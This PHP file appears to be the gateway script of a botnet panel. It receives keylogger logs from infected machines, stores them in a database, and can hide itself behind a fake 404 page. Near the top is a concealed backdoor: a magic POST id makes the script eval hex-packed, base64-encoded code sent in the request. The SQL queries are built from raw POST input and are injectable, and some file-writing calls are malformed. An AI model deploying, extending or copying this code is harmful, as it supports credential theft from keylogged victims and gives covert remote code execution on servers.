<?php

error_reporting(0);
$debag = false;

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

if(file_exists($dir . 'cache/config.json')) $config = json_decode(file_get_contents($dir . 'cache/config.json'), 1);

if($config['getkl'] == 1){
	print_data('403', true, false);
	exit;
}

if($config['scramb'] == 1 && $gateway != true){	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

if(empty($_POST['type'])) print_data('NOT TYPE', true, false);
$write = true;
switch($_POST['type']){	case '1':
		$cfg_db = get_config();
		$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
		if(mysqli_connect_errno()) print_data('DB ERROR', true, false);
		
		$add = '';
		$result = $mysqli->query('SELECT * FROM bf_keylog');
		while($row = $result->fetch_object()) $add .= $row->hash . '|';
		
		if($config['scramb'] == 1){
			include_once($dir . 'includes/functions.rc.php');
			print(rc_encode($add));
		}else{
			print($add);
		}
	break;

	case '2':
		if(empty($_POST['shash']) || empty($_POST['hash'])) print_data('NOT DATA', true, false);
		
		if(!preg_match('~^([0-9a-zA-Z]+)$~is', $_POST['hash']) || !preg_match('~^([0-9a-zA-Z]+)$~is', $_POST['shash'])) print_data('NOT DATA', true, false);
		
		$cfg_db = get_config();
		$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
		if(mysqli_connect_errno()) print_data('DB ERROR', true, false);
		
		$result = $mysqli->query('SELECT hash FROM bf_keylog WHERE (hash = \''.$_POST['hash'].'\') LIMIT 1');
		$r = @$result->fetch_object();
		
		if($r->hash == $_POST['hash']){
			if(!empty($_POST['log'])){
				//$cfg_db = get_config();
				//$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
				//if(mysqli_connect_errno())print_data('DB ERROR', true, false);
				
				$result = $mysqli->query('SELECT id, prefix, uid, hash, shash FROM bf_keylog_data WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') AND (hash = \''.$_POST['hash'].'\') AND (shash = \''.$_POST['shash'].'\') LIMIT 1');
				$row = $result->fetch_object();
				
				$_POST['log'] = str_replace("'", '', $_POST['log']);
				
				if($row->prefix == $_POST['prefix'] && $row->uid == $_POST['uid'] && $row->hash == $_POST['hash'] && $row->shash == $_POST['shash']){
					$mysqli->real_query('update bf_keylog_data set (data = \''.$_POST['log'].'\') WHERE (id = \''.$row->id.'\')');
					//if(!$mysqli->real_query('update bf_keylog_data set (data = \''.$_POST['log'].'\') WHERE (id = \''.$row->id.'\')')) $write = false;
				}else{
					if(!$mysqli->real_query('INSERT DELAYED INTO bf_keylog_data (prefix, uid, hash, shash, data) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$_POST['hash'].'\', \''.$_POST['shash'].'\', \''.$_POST['log'].'\')')) $write = false;
				}
			}
		}
		
		if($write == true){
			print_data('403', true, false);
		}else{
			print_data('ERROR!', true, false);
		}
	break;

	case '3':
		file_put_contents($dir . 'cache/kls/' . '0x321ECF12_' . $prefix . $uid);
	break;

	case '4':
		file_put_contents($dir . 'cache/kls/' . '0x321ECF12_' . $prefix . $uid);
	break;

	default:
		print_data('NOT TYPE', true, false);
	break;
}

?>